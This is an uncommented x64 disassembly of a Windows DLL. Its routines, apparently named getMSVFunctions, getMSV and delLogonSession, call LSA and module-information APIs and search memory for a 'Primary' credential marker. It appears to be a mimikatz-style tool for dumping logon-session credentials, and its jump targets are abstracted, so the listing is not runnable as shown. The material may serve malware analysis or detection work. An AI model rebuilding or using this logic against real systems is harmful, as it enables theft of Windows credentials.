call sub_1800023b0
lea rdx [ rsp + 0x78 ]
mov rcx r13
call sub_180001b10
lea rcx [ rbp - 0x40 ]
movzx edi al
call [ rw-data ]
jmp r-xdata
mov rcx [ rsp + 0x60 ]
cmp [ rcx ] ebx
jbe r-xdata
lea rcx [ rbp + 0x158 ]
call sub_18000dd20
lea rcx [ rbp + 0x158 ]
mov [ rbp + 0x158 ] rsi
call sub_180017208
cmp [ rbp + 0x200 ] 0x8
jb r-xdata
call [ LsaFreeMemory@IAT ]
lea rcx [ rbp - 0x40 ]
call [ rw-data ]
jmp r-xdata
lea rcx [ rbp - 0x30 ]
call sub_18000dc80
mov rax [ rsp + 0x60 ]
mov r12b 0x1
mov esi ebx
cmp [ rax ] ebx
jbe r-xdata
lea rcx [ rbp - 0x30 ]
mov edx 0xa
call sub_18000db30
mov rax [ rbp - 0x30 ]
mov edi ebx
movsxd rcx [ rax + 0x4 ]
test [ rbp + rcx - 0x20 ] 0x6
jne r-xdata
mov r13d 0x30
lea r14d [ r13 - 0x10 ]
nop [ rax + rax ] ax
movsxd rax [ rax + 0x4 ]
lea rcx [ rbp + rax - 0x30 ]
test edi edi
je r-xdata
mov rcx [ rbp + rcx + 0x18 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov rax [ rbp - 0x30 ]
cmove edi r15d
test dil dil
setne al
test dil dil
sete al
jmp r-xdata
test r12b r12b
je r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] rbx
jne r-xdata
mov rax [ rsp + 0x60 ]
cmp esi [ rax ]
jb r-xdata
lea rcx [ rbp - 0x30 ]
mov edx 0xa
call sub_18000db30
mov rax [ rbp - 0x30 ]
mov edi ebx
movsxd rcx [ rax + 0x4 ]
test [ rbp + rcx - 0x20 ] 0x6
jne r-xdata
lea rcx [ rbp + 0xc0 ]
mov edx 0x2
and r12b al
call sub_180017d60
mov rcx [ rbp - 0x30 ]
movsxd rdx [ rcx + 0x4 ]
lea rcx [ rbp + rdx - 0x30 ]
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rbp - 0x30 ]
movzx edx dil
movsxd rax [ r11 + 0x4 ]
mov [ rbp + rax + 0x28 ] r13w
mov rax [ rbp - 0x30 ]
movsxd rcx [ rax + 0x4 ]
and [ rbp + rcx - 0x18 ] 0xfffff9ff
or [ rbp + rcx - 0x18 ] 0x800
lea rcx [ rbp - 0x30 ]
call sub_18000d770
movzx edx r14w
mov rcx rax
call sub_180008d10
inc esi
test sil 0x1f
jne r-xdata
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp - 0x30 ]
call sub_18000ddd0
mov rcx r13
mov rdx rax
call sub_180001b10
lea rcx [ rbp + 0x58 ]
movzx edi al
call sub_18000dd20
lea rsi [ r--data ]
lea rcx [ rbp + 0x58 ]
mov [ rbp + 0x58 ] rsi
call sub_180017208
mov rcx [ rsp + 0x60 ]
mov rax [ rsp + 0x60 ]
lea rcx [ rbp + 0x1c0 ]
mov r8d [ rax ]
mov rdx [ rax + 0x8 ]
mov [ rbp + 0x1d8 ] 0x7
shr r8 0x1
mov [ rbp + 0x1d0 ] rbx
mov [ rbp + 0x1c0 ] bx
call sub_1800023b0
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
call sub_180008ab0
lea rdx [ rbp + 0x1c0 ]
mov rcx rax
call sub_18000def0
mov rcx rax
call sub_180009790
cmp [ rbp + 0x1d8 ] 0x8
jb r-xdata
xor r8d r8d
call sub_1800037f0
or edx r15d
mov rax [ rax + 0x8 ]
mov ecx esi
movzx edi [ rcx + rax ]
mov eax ebx
test sil 0x1
je r-xdata
mov r13 [ rbp - 0x38 ]
mov r14d [ rsp + 0x68 ]
movsxd rax [ rax + 0x4 ]
lea rcx [ rbp + rax - 0x30 ]
test edi edi
je r-xdata
mov rcx [ rbp + rcx + 0x18 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
mov rax [ rbp - 0x30 ]
cmove edi r15d
mov rcx [ rbp + 0x1c0 ]
call j_sub_180018b3c
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] rbx
jne r-xdata
xor r8d r8d
call sub_1800037f0
or edx r15d
sub_18000eb80
sub rsp 0x78
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
cmp [ rw-data ] 0x0
mov [ rsp + 0x80 ] rbx
mov [ rsp + 0x28 ] 0x158d48
mov rbx 0x7972616d697250
mov [ rsp + 0x2c ] 0x48000000
mov [ rsp + 0x20 ] 0x9090
mov [ rsp + 0x22 ] 0x90
je r-xdata
lea rcx [ r--data ]
mov [ rsp + 0x70 ] rdi
call [ GetModuleHandleW@IAT ]
mov rdi rax
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rdi [ rsp + 0x70 ]
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x18
mov rcx rax
mov rdx rdi
call [ GetModuleInformation@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor al al
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_180018450
add rsp 0x78
retn
cmp [ rw-data ] 0x0
je r-xdata
mov [ rsp + 0x88 ] rbp
mov [ rsp + 0x90 ] rsi
mov esi [ rsp + 0x38 ]
mov [ rsp + 0x58 ] r14
mov r14 [ rsp + 0x30 ]
mov ecx 0x8
add rsi r14
mov [ rsp + 0x50 ] r15
call j_sub_180018a08
mov r15 r14
mov r8b 0x1
xor dil dil
mov rbp rax
cmp [ rw-data ] 0x0
mov rbx [ rsp + 0x80 ]
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test r8b r8b
je r-xdata
xor edx edx
lea rcx [ r15 + 0x8 ]
cmp rcx rsi
setbe dl
test edx edx
je r-xdata
mov al 0x1
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_180018450
add rsp 0x78
retn
mov rcx rbp
call j_sub_180018b3c#2
test dil dil
je r-xdata
test dil dil
jne r-xdata
mov r14 [ rsp + 0x58 ]
mov rbp [ rsp + 0x88 ]
mov rsi [ rsp + 0x90 ]
mov r15 [ rsp + 0x50 ]
mov rbx [ rsp + 0x28 ]
mov [ rsp + 0x68 ] r12
mov [ rsp + 0x60 ] r13
lea r12 [ r14 - 0x1 ]
mov r9d 0x8
mov r8 r15
mov rcx rbp
mov edx r9d
call sub_180018ab4
test eax eax
sete r8b
test r8b r8b
je r-xdata
mov ecx 0x8
lea rbp [ r12 + 0x1 ]
call j_sub_180018a08
mov ecx 0x8
mov rsi rax
call j_sub_180018a08
mov [ rsi ] rbx
mov r13 rax
nop [ rax + rax ] ax
cmp [ rw-data ] 0x0
je r-xdata
test rsi rsi
je r-xdata
cmp [ rbp ] rbx
sete dil
test dil dil
jne r-xdata
mov rcx rsi
call j_sub_180018b3c#2
test r12b r12b
je r-xdata
test dil dil
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
inc r15
jmp r-xdata
mov r13 [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
test dil dil
je r-xdata
mov ecx r15d
mov r9d 0x8
mov r8 rbp
sub ecx ebp
mov edx r9d
sub ecx 0x7
mov [ rsi + 0x3 ] ecx
mov rcx r13
call sub_180018ab4
test eax eax
mov rax [ r13 ]
sete dil
cmp rax [ rsi ]
sete r12b
inc rbp
test r12b r12b
jne r-xdata
mov ecx 0x3
lea r12 [ rbp - 0x1 ]
call j_sub_180018a08
mov rdi r12
mov r8b 0x1
mov rbp rax
xor sil sil
test r8b r8b
je r-xdata
xor edx edx
lea rcx [ rdi - 0x3 ]
cmp rcx r14
setae dl
test edx edx
je r-xdata
mov rcx rbp
call j_sub_180018b3c#2
test sil sil
je r-xdata
test sil sil
jne r-xdata
add rdi 0x3
mov rax r12
sub rax rdi
add rax 0xfffffffffffffff9
cmp rax 0x35
ja r-xdata
mov r9d 0x3
mov r8 rdi
mov rcx rbp
mov edx r9d
call sub_180018ab4
test eax eax
sete r8b
test r8b r8b
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea rdx [ __dos_header ]
movzx eax [ rdx + rax + 0xeeec ]
mov ecx [ rdx + rax * 4 + 0xeedc ]
add rcx rdx
jmp rcx
test r14 r14
je r-xdata
movzx edx [ rbp ]
lea rcx [ rsp + 0x20 ]
cmp dx [ rcx ]
jne r-xdata
mov [ rw-data ] rdi
jmp r-xdata
mov [ rw-data ] rdi
jmp r-xdata
mov [ rw-data ] rdi
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
movzx edx [ rbp + 0x2 ]
cmp dl [ rcx + 0x2 ]
jne r-xdata
dec rdi
jmp r-xdata
xor eax eax
jmp r-xdata
test eax eax
sete sil
test sil sil
jne r-xdata
sub_18000eef0
add eax [ rcx ]
add eax [ rbx ]
add [ rbx ] eax
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add [ rcx ] eax
add eax [ rbx ]
add al [ rbx ]
add eax [ rdx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rbx ]
add eax [ rdx ]
add eax [ rbx ]
add eax [ rdx ]
int3
getMSVFunctions
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x140
lea rax [ r--data ]
mov rdi rcx
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0x20 ] rax
lea rax [ r--data ]
xor ebx ebx
mov [ rsp + 0xa8 ] rax
mov [ rsp + 0x160 ] ebx
call sub_180003960
lea r11 [ rsp + 0x28 ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xf8 ] rbx
mov [ rsp + 0xf0 ] r11
call sub_180005300
mov [ rsp + 0x100 ] ax
cmp [ rsp + 0xf0 ] rbx
jne r-xdata
mov rax [ rsp + 0x20 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x20 ] rax
lea rcx [ rsp + 0x28 ]
call sub_1800050e0
lea r11 [ r--data ]
mov [ rsp + 0x98 ] rbx
mov [ rsp + 0x28 ] r11
mov [ rsp + 0xa0 ] 0x4
call sub_18000eb80
lea rcx [ r--data ]
test al al
lea rbx [ r--data ]
cmovne rbx rcx
lea rcx [ rsp + 0x20 ]
lea rdx [ r--data ]
call sub_180008ab0
mov rdx rbx
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rdx [ rw-data ]
mov rcx rax
call sub_18000d950
mov rcx rax
call sub_180009790
lea rdx [ rsp + 0x110 ]
lea rcx [ rsp + 0x20 ]
call sub_18000ddd0
mov rcx rdi
mov rdx rax
call sub_180001b10
lea rcx [ rsp + 0xa8 ]
movzx ebx al
call sub_18000dd20
lea r11 [ r--data ]
lea rcx [ rsp + 0xa8 ]
mov [ rsp + 0xa8 ] r11
call sub_180017208
movzx eax bl
mov rbx [ rsp + 0x150 ]
add rsp 0x140
pop rdi
retn
mov edx [ rsp + 0xb8 ]
lea rcx [ rsp + 0xa8 ]
xor r8d r8d
or edx 0x4
call sub_1800037f0
getMSV
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rbp
push rdi
push r12
push r13
push r14
lea rbp [ rsp - 0x37 ]
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
xor r13d r13d
lea rax [ sub_18000f280 ]
mov rbx rcx
mov rcx [ r--data ]
mov [ rbp - 0x59 ] rax
mov eax [ r--data ]
mov [ rbp - 0x29 ] eax
mov [ rbp - 0x31 ] r13w
mov [ rbp - 0x31 ] rcx
mov r14d 0x7
mov rdi rdx
mov [ rbp - 0x21 ] 0x6
mov [ rbp - 0x19 ] r14
lea rax [ rbp - 0x31 ]
cmp r14 0x8
cmovae rax rcx
lea r8 [ rbp - 0x31 ]
lea rdx [ rbp - 0x59 ]
lea rcx [ rbp - 0x9 ]
mov [ rbp - 0x51 ] r13
mov [ rbp - 0x49 ] r13
mov [ rbp - 0x41 ] r13
mov [ rax + 0xc ] r13w
call sub_180014980
lea rcx [ rbp - 0x51 ]
mov rdx rax
call sub_180010d20
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
cmp [ rbp - 0x19 ] 0x8
mov [ rbp + 0x17 ] r14
mov [ rbp + 0xf ] r13
mov [ rbp - 0x1 ] r13w
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_180018b3c
lea r8 [ rbp - 0x51 ]
mov rdx rdi
mov rcx rbx
call sub_180016650
mov rsi [ rbp - 0x51 ]
movzx r12d al
test rsi rsi
je r-xdata
mov rcx [ rbp - 0x31 ]
call j_sub_180018b3c
movzx eax r12b
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
mov rdi [ rbp - 0x49 ]
cmp rsi rdi
je r-xdata
mov rcx rsi
call j_sub_180018b3c
lea rbx [ rsi + 0x20 ]
nop [ rax + rax ] eax
mov [ rbx ] r14
mov [ rbx - 0x8 ] r13
mov [ rbx - 0x18 ] r13w
add rbx 0x30
lea rax [ rbx - 0x20 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_180018b3c
cmp [ rbx ] 0x8
jb r-xdata
sub_18000f280
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x300 ]
sub rsp 0x400
mov [ rbp + 0x120 ] 0xfffffffffffffffe
mov [ rsp + 0x450 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f8 ] rax
movzx edi r8b
mov rsi rdx
mov rbx rcx
xor r13d r13d
mov [ rsp + 0x20 ] r13d
call sub_18000eb80
test al al
je r-xdata
mov r8d 0xd
lea rdx [ r--data ]
mov [ rsp + 0x30 ] r13d
mov [ rsp + 0x28 ] r13
lea r8 [ rsp + 0x30 ]
lea rdx [ rsp + 0x28 ]
mov rcx rbx
call [ rw-data ]
test eax eax
js r-xdata
mov r8d 0xe
lea rdx [ r--data ]
jmp r-xdata
lea r15 [ r--data ]
mov [ rsp + 0x40 ] r15
mov [ rsp + 0x20 ] 0x1
lea rbx [ r--data ]
mov [ rbp - 0x38 ] rbx
lea rcx [ rbp - 0x38 ]
call sub_180003960
lea r11 [ rsp + 0x48 ]
mov [ rbp + 0x10 ] r11
mov [ rbp + 0x18 ] r13
lea rcx [ rbp - 0x38 ]
call sub_180005300
mov [ rbp + 0x20 ] ax
cmp [ rbp + 0x10 ] r13
jne r-xdata
mov [ rbp + 0x258 ] 0x7
mov [ rbp + 0x250 ] r13
mov [ rbp + 0x240 ] r13w
lea rcx [ rbp + 0x240 ]
call sub_1800023b0
lea rdx [ rbp + 0x240 ]
mov rcx rsi
call sub_180001b10
mov rax [ rsp + 0x40 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x40 ] rax
lea rcx [ rsp + 0x48 ]
call sub_1800050e0
nop
lea r12 [ r--data ]
mov [ rsp + 0x48 ] r12
mov [ rbp - 0x48 ] r13
mov r14d 0x4
mov [ rbp - 0x40 ] r14d
mov [ rbp + 0x30 ] r15
mov [ rsp + 0x20 ] 0x5
mov [ rbp + 0xb8 ] rbx
lea rcx [ rbp + 0xb8 ]
call sub_180003960
lea r11 [ rbp + 0x38 ]
mov [ rbp + 0x100 ] r11
mov [ rbp + 0x108 ] r13
lea rcx [ rbp + 0xb8 ]
call sub_180005300
mov [ rbp + 0x110 ] ax
cmp [ rbp + 0x100 ] 0x0
jne r-xdata
mov edx [ rbp - 0x28 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp - 0x38 ]
call sub_1800037f0
nop
mov rax [ rbp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx + 0x30 ] rax
lea rcx [ rbp + 0x38 ]
call sub_1800050e0
nop
mov [ rbp + 0x38 ] r12
mov [ rbp + 0xa8 ] r13
mov [ rbp + 0xb0 ] r14d
mov rbx r13
mov r12d 0x10
lea r15d [ r12 + 0x20 ]
nop [ rax ] eax
mov edx [ rbp + 0xc8 ]
or edx r14d
xor r8d r8d
lea rcx [ rbp + 0xb8 ]
call sub_1800037f0
nop
mov edx 0x2
lea rcx [ rbp + 0x230 ]
call sub_180017d60
mov rcx [ rsp + 0x40 ]
movsxd rdx [ rcx + 0x4 ]
lea rcx [ rsp + rdx + 0x40 ]
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rsp + 0x40 ]
movsxd rax [ r11 + 0x4 ]
mov [ rbp + rax - 0x68 ] r15w
mov rax [ rsp + 0x40 ]
movsxd rcx [ rax + 0x4 ]
and [ rsp + rcx + 0x58 ] 0xfffff9ff
or [ rsp + rcx + 0x58 ] 0x800
mov rax [ rsp + 0x28 ]
movzx edx [ rbx + rax + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_18000d770
mov edx 0x2
lea rcx [ rbp + 0x220 ]
call sub_180017d60
mov rcx [ rbp + 0x30 ]
movsxd rdx [ rcx + 0x4 ]
lea rcx [ rbp + rdx + 0x30 ]
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rbp + 0x30 ]
movsxd rax [ r11 + 0x4 ]
mov [ rbp + rax + 0x88 ] r15w
mov rax [ rbp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
and [ rbp + rcx + 0x48 ] 0xfffff9ff
or [ rbp + rcx + 0x48 ] 0x800
mov rax [ rsp + 0x28 ]
movzx edx [ rbx + rax + 0x20 ]
lea rcx [ rbp + 0x30 ]
call sub_18000d770
inc rbx
dec r12
jne r-xdata
lea r15 [ r--data ]
mov [ rbp + 0x130 ] r15
mov [ rsp + 0x20 ] 0x15
lea rax [ r--data ]
mov [ rbp + 0x1b8 ] rax
lea rcx [ rbp + 0x1b8 ]
call sub_180003960
lea r11 [ rbp + 0x138 ]
mov [ rbp + 0x200 ] r11
mov [ rbp + 0x208 ] r13
lea rcx [ rbp + 0x1b8 ]
call sub_180005300
mov [ rbp + 0x210 ] ax
cmp [ rbp + 0x200 ] r12
jne r-xdata
mov rax [ rbp + 0x130 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx + 0x130 ] rax
lea rcx [ rbp + 0x138 ]
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rbp + 0x138 ] rax
mov [ rbp + 0x1a8 ] r13
mov [ rbp + 0x1b0 ] r14d
test dil dil
je r-xdata
mov edx [ rbp + 0x1c8 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp + 0x1b8 ]
call sub_1800037f0
nop
mov rax [ rsp + 0x28 ]
movzx r8d [ rax + 0x10 ]
shr r8 0x1
mov rdx [ rax + 0x18 ]
mov [ rbp + 0x280 ] 0x7
mov [ rbp + 0x278 ] r13
mov [ rbp + 0x268 ] r13w
lea rcx [ rbp + 0x268 ]
call sub_1800023b0
nop
mov rax [ rsp + 0x28 ]
movzx r8d [ rax ]
shr r8 0x1
mov rdx [ rax + 0x8 ]
mov [ rbp + 0x2a8 ] 0x7
mov [ rbp + 0x2a0 ] r13
mov [ rbp + 0x290 ] r13w
lea rcx [ rbp + 0x290 ]
call sub_1800023b0
nop
lea rdx [ rbp + 0x2b8 ]
lea rcx [ rbp + 0x30 ]
call sub_18000ddd0
mov rdi rax
lea rdx [ rbp + 0x240 ]
lea rcx [ rsp + 0x40 ]
call sub_18000ddd0
mov r12 rax
mov edx 0xa
lea rcx [ rbp + 0x130 ]
call sub_18000db30
mov ebx r13d
mov rcx [ rbp + 0x130 ]
movsxd rdx [ rcx + 0x4 ]
test [ rbp + rdx + 0x140 ] 0x6
jne r-xdata
lea rdx [ rbp + 0x240 ]
lea rcx [ rbp + 0x30 ]
call sub_18000ddd0
mov rdi rax
lea rdx [ rbp + 0x268 ]
lea rcx [ rsp + 0x40 ]
call sub_18000ddd0
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rbp + 0x130 ]
call sub_180008ab0
mov rcx rax
mov rdx rbx
call sub_18000def0
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rcx rax
mov rdx rdi
call sub_18000def0
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
nop
cmp [ rbp + 0x280 ] 0x8
jb r-xdata
movsxd rax [ rcx + 0x4 ]
lea rcx [ rbp + rax + 0x130 ]
test ebx ebx
je r-xdata
mov rcx [ rbp + rdx + 0x178 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove ebx r14d
mov rcx [ rbp + 0x130 ]
mov [ rbp + 0x280 ] 0x7
mov [ rbp + 0x278 ] r13
mov [ rbp + 0x268 ] r13w
cmp [ rbp + 0x258 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x268 ]
call j_sub_180018b3c
lea rdx [ r--data ]
lea rcx [ rbp + 0x130 ]
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x268 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rbp + 0x290 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
mov rdx r12
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
mov rdx rdi
call sub_18000def0
nop
cmp [ rbp + 0x258 ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
lea rdx [ rbp + 0x2b8 ]
lea rcx [ rbp + 0x130 ]
call sub_18000ddd0
mov rdx rax
mov rcx rsi
call sub_180001b10
movzx ebx al
lea rcx [ rbp + 0x1b8 ]
call sub_18000dd20
lea rdi [ r--data ]
mov [ rbp + 0x1b8 ] rdi
lea rcx [ rbp + 0x1b8 ]
call sub_180017208
nop
lea rcx [ rbp + 0xb8 ]
call sub_18000dd20
mov [ rbp + 0xb8 ] rdi
lea rcx [ rbp + 0xb8 ]
call sub_180017208
nop
lea rcx [ rbp - 0x38 ]
call sub_18000dd20
mov [ rbp - 0x38 ] rdi
lea rcx [ rbp - 0x38 ]
call sub_180017208
movzx eax bl
jmp r-xdata
mov rcx [ rbp + 0x240 ]
jmp r-xdata
mov [ rbp + 0x258 ] 0x7
mov [ rbp + 0x250 ] r13
mov [ rbp + 0x240 ] r13w
cmp [ rbp + 0x2d0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x240 ]
call j_sub_180018b3c
xor r8d r8d
call sub_1800037f0
or edx 0x4
mov rcx [ rbp + 0x2f8 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x450 ]
add rsp 0x400
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call j_sub_180018b3c
cmp [ rbp + 0x2a8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2b8 ]
call j_sub_180018b3c
nop
mov [ rbp + 0x2a8 ] 0x7
mov [ rbp + 0x2a0 ] r13
mov [ rbp + 0x290 ] r13w
cmp [ rbp + 0x280 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x290 ]
call j_sub_180018b3c
mov rcx [ rbp + 0x268 ]
delLogonSession
push rbp
push rsi
push rdi
lea rbp [ rsp - 0x47 ]
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov rdi rdx
mov rsi rcx
call sub_18000eb80
test al al
je r-xdata
mov rdx rdi
mov rcx rsi
call getMSVFunctions
jmp r-xdata
mov rax [ rdi ]
mov rcx [ rdi + 0x8 ]
mov [ rsp + 0xf0 ] rbx
mov [ rsp + 0xb8 ] r12
xor r12d r12d
mov [ rsp + 0xb0 ] r13
mov r13d 0x7
mov [ rbp - 0x41 ] r12
mov [ rbp - 0x51 ] r12w
mov [ rbp - 0x39 ] r13
cmp rax rcx
je r-xdata
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_180018450
add rsp 0xc0
pop rdi
pop rsi
pop rbp
retn
lea rdi [ r--data ]
lea rax [ rbp - 0x51 ]
cmp rdi rax
jb r-xdata
sub rcx rax
mov rbx 0x6666666666666667
mov rax rbx
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
jb r-xdata
mov ebx 0x44
lea rcx [ rbp - 0x51 ]
xor r8d r8d
mov edx ebx
call sub_1800027d0
cmp [ rbp - 0x39 ] 0x8
lea rcx [ rbp - 0x51 ]
cmovae rcx [ rbp - 0x51 ]
lea r8d [ rbx + 0x44 ]
mov rdx rdi
call sub_180018670
cmp [ rbp - 0x39 ] 0x8
lea rax [ rbp - 0x51 ]
cmovae rax [ rbp - 0x51 ]
mov [ rbp - 0x41 ] rbx
mov [ rax + 0x88 ] r12w
lea rax [ rbp - 0x51 ]
cmp rax rdi
jbe r-xdata
cmp rdx 0x2
ja r-xdata
mov r12 [ rsp + 0xb8 ]
mov rbx [ rsp + 0xf0 ]
mov r13 [ rsp + 0xb0 ]
movzx eax dil
mov rcx [ rbp - 0x51 ]
call j_sub_180018b3c
lea rax [ rbp - 0x51 ]
sub rdi rax
sar rdi 0x1
je r-xdata
movzx eax [ r--data ]
mov [ rbp - 0x29 ] r12w
mov [ rbp - 0x11 ] r13
mov [ rbp - 0x29 ] ax
mov [ rbp - 0x19 ] 0x1
lea rcx [ rbp - 0x29 ]
cmp r13 0x8
cmovae rcx [ rbp - 0x29 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov [ rcx + 0x2 ] r12w
mov rdx [ rdi ]
lea rcx [ rbp - 0x1 ]
mov [ rbp + 0x17 ] r13
mov [ rbp + 0xf ] r12
mov [ rbp - 0x1 ] r12w
call sub_180002260
mov r11 [ rdi ]
mov rcx [ rdi + 0x8 ]
sub rcx r11
mov rax rbx
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
jbe r-xdata
mov ebx 0x44
mov rax rdi
lea rcx [ rbp - 0x51 ]
neg rax
cmp rax rbx
cmova rax rbx
or r8 0xffffffffffffffff
lea rdx [ rax + rdi ]
call sub_1800024a0
lea rcx [ rbp - 0x51 ]
mov r8 rdi
xor edx edx
call sub_1800024a0
jmp r-xdata
lea rcx [ r--data ]
call sub_180016ebc
lea rdx [ rbp - 0x1 ]
lea rcx [ rbp - 0x29 ]
call sub_180010730
mov [ rbp - 0x59 ] rax
test eax eax
je r-xdata
lea rcx [ rbp - 0x29 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r11
call sub_180002260
mov rdx [ rdi + 0x8 ]
lea rcx [ rbp - 0x1 ]
sub rdx 0x28
or r9 0xffffffffffffffff
xor r8d r8d
call sub_180002260
lea rdx [ r--data ]
lea rcx [ rbp - 0x51 ]
mov r8d 0x1
call sub_180002150
lea rdx [ rbp - 0x51 ]
lea rcx [ rbp - 0x29 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov [ rbp - 0x11 ] r13
mov [ rbp - 0x19 ] r12
mov [ rbp - 0x29 ] r12w
call sub_180002260
lea rdx [ rbp - 0x29 ]
mov rcx rsi
call sub_180001b10
cmp [ rbp - 0x39 ] 0x8
movzx edi al
jb r-xdata
mov rdx [ rbp - 0x39 ]
mov r9 [ rbp - 0x51 ]
mov r8 [ rbp - 0x41 ]
cmp rdx 0x8
lea rax [ rbp - 0x51 ]
lea rdi [ r--data ]
cmovae rax r9
cmp rdi rax
jb r-xdata
lea rcx [ rbp - 0x59 ]
call [ rw-data ]
lea rcx [ r--data ]
lea rdx [ r--data ]
test eax eax
cmovns rdx rcx
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x51 ]
call sub_1800023b0
jmp r-xdata
mov ebx 0x3b
cmp rdx rbx
jae r-xdata
cmp rdx 0x8
lea rax [ rbp - 0x51 ]
cmovae rax r9
lea rax [ rax + r8 * 2 ]
cmp rax rdi
jbe r-xdata
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
cmp rdx 0x8
lea rcx [ rbp - 0x51 ]
mov r8d 0x76
cmovae rcx r9
mov rdx rdi
call sub_180018670
cmp [ rbp - 0x39 ] 0x8
lea rax [ rbp - 0x51 ]
cmovae rax [ rbp - 0x51 ]
mov [ rbp - 0x41 ] rbx
mov [ rax + 0x76 ] r12w
lea rcx [ rbp - 0x51 ]
mov edx ebx
call sub_1800027d0
mov rdx [ rbp - 0x39 ]
mov r9 [ rbp - 0x51 ]
cmp rdx 0x8
lea rax [ rbp - 0x51 ]
cmovae rax r9
sub rdi rax
sar rdi 0x1
cmp r8 rdi
jae r-xdata
cmp [ rbp - 0x11 ] 0x8
mov [ rbp + 0x17 ] r13
mov [ rbp + 0xf ] r12
mov [ rbp - 0x1 ] r12w
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_180018b3c
sub r8 rdi
